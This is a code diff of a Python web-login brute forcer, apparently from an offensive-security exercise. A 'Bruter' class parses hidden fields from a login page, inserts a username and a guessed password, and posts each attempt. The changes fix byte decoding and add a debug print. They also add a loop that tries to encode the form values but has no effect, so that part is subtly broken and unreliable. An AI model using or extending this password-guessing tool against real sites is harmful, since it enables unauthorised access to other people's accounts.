@@ -12,6 +12,7 @@ import urllib.parse
 import urllib.request
 from abc import ABC
 from html.parser import HTMLParser
+import json
 
 #general settings
 user_thread = 10
@@ -72,15 +73,24 @@ class Bruter(object):
             ))
             
             #parse out the hidden fields
-            parser = BruteParser()
-            parser.feed(page)
+          
             
+            parser = BruteParser()
+            parser.feed(page.decode())
+
+            print('Parser : ', parser)
             post_tags = parser.tag_results
             
             post_tags[username_field] = self.username
             post_tags[password_field] = brute
             
+            for key, value in post_tags.items():
+                key = key.encode()
+                value = value.encode()
+            # post_tags_bytes = json.dumps(post_tags,indent=2).encode('utf-8')
+
             login_data = urllib.parse.urlencode(post_tags)
+            
             login_response = opener.open(target_post,login_data)
             
             login_result = login_response.read()
